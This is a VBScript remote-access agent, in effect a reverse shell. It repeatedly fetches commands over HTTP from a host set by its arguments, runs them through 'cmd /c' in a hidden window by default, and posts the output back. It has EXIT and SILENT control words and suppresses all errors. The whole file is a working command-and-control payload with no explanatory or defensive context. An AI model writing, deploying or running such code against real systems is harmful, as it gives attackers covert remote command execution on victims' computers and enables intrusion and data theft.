Option Explicit
On Error Resume Next

Const EXITINT = "EXIT"
Const SILENTON = "SILENT ON"
Const SILENTOFF = "SILENT OFF"
Const CMD = "cmd /c "
Const STDOUT = "stdout"

Dim callbackUrl
Dim ip, port
Dim silent
Dim xmlHttpReq, shell, execObj, command, break, result

callbackUrl = "http://"
ip = "127.0.0.1"
port = "80"

If WScript.Arguments.Count > 0 Then
	ip = Wscript.Arguments(0)
End If

If WScript.Arguments.Count > 1 Then
	If IsNumeric(Wscript.Arguments(1)) Then
		port = Wscript.Arguments(1)
	End If
End If

callbackUrl = callbackUrl & ip & ":" & port

silent = True

Set shell = CreateObject("WScript.Shell")

break = False
While break <> True
	Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
	xmlHttpReq.Open "GET", callbackUrl, false
	xmlHttpReq.Send

	command = CMD & Trim(xmlHttpReq.responseText)

	If InStr(command, EXITINT) Then
		break = True
	ElseIf InStr(command, SILENTON) Then
		silent = True
	ElseIf InStr(command, SILENTOFF) Then
		silent = False
	Else
		result = ""
		If silent = True Then
			set execObj = shell.Run(command & ">" & STDOUT, 0, True)

			With CreateObject("Scripting.FileSystemObject")
				result = .OpenTextFile(STDOUT).ReadAll()
				.DeleteFile STDOUT
			End With
		Else
			Set execObj = shell.Exec(command)

			Do Until execObj.StdOut.AtEndOfStream
				result = result & execObj.StdOut.ReadAll()
			Loop
		End If

		Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
		xmlHttpReq.Open "POST", callbackUrl, false
		xmlHttpReq.Send result
	End If
Wend
